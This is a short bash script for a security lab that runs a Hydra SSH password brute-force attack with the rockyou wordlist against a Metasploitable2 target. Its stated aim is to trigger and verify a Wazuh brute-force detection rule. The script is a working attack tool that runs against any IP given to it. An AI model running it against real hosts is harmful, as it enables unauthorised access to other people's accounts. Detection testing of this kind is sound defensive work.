#!/usr/bin/env bash

set -euo pipefail

VICTIM_IP="${1:?Usage: $0 <victim-ip> [username] [wordlist]}"
USERNAME="${2:-msfadmin}"          # msfadmin is the default Metasploitable2 user
WORDLIST="${3:-/usr/share/wordlists/rockyou.txt}"

if [ ! -f "$WORDLIST" ]; then
  echo "[!] Wordlist not found at $WORDLIST"
  echo "    On Kali: sudo gunzip /usr/share/wordlists/rockyou.txt.gz"
  exit 1
fi

echo "[*] Target       : $VICTIM_IP:22"
echo "[*] Username     : $USERNAME"
echo "[*] Wordlist     : $WORDLIST"
echo "[*] This will trigger Wazuh rule 100010 (SSH Brute Force)."
echo

hydra -l "$USERNAME" -P "$WORDLIST" -t 4 -f "ssh://${VICTIM_IP}"

echo
echo "[*] Done. Check the Wazuh dashboard -> Security Events, filter rule.id:100010"
